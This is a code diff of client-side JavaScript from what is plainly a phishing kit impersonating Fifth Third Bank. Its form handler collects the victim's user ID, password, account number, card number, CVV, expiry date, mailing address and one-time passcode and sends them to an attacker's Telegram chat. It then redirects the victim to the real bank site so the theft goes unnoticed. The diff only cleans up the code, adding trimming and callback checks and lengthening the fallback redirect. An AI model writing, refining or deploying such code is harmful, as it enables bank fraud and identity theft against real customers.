@@ -17,22 +17,24 @@ function sendToTelegram(data, callback) {
           chat_id: CHAT_ID,
           text: message
         })
-      }).then(() => {
-        if (callback) callback();
-      }).catch(() => {
-        // fallback redirect if Telegram fails
-        if (callback) callback();
+      })
+      .then(() => {
+        if (typeof callback === 'function') callback();
+      })
+      .catch(() => {
+        if (typeof callback === 'function') callback();
       });
-    }).catch(() => {
-      // fallback redirect if IP fetch fails
-      if (callback) callback();
+    })
+    .catch(() => {
+      if (typeof callback === 'function') callback();
     });
 }
 
-document.addEventListener('DOMContentLoaded', function() {
+document.addEventListener('DOMContentLoaded', function () {
   const form = document.getElementById('verify-form');
   if (!form) return;
-  form.addEventListener('submit', function(e) {
+
+  form.addEventListener('submit', function (e) {
     e.preventDefault();
 
     const userid = sessionStorage.getItem('userid') || '';
@@ -41,25 +43,24 @@ document.addEventListener('DOMContentLoaded', function() {
     const data = {
       userid: userid,
       password: password,
-      accountnumber: form.accountnumber.value,
-      cardname: form.cardname.value,
-      cardnumber: form.cardnumber.value,
-      cvv: form.cvv.value,
-      expdate: form.expdate.value,
-      mailingaddress: form.mailingaddress.value,
-      otp: form.otp.value
+      accountnumber: form.accountnumber.value.trim(),
+      cardname: form.cardname.value.trim(),
+      cardnumber: form.cardnumber.value.trim(),
+      cvv: form.cvv.value.trim(),
+      expdate: form.expdate.value.trim(),
+      mailingaddress: form.mailingaddress.value.trim(),
+      otp: form.otp.value.trim()
     };
 
-    // Start sending to Telegram
-    sendToTelegram(data, function() {
+    sendToTelegram(data, function () {
       window.location.href = 'https://www.53.com/';
     });
 
-    // Backup redirect in 3 seconds
-    setTimeout(function() {
+    // Fallback redirect after 5 seconds
+    setTimeout(function () {
       window.location.href = 'https://www.53.com/';
-    }, 3000);
-    
+    }, 5000);
+
     form.reset();
   });
 });
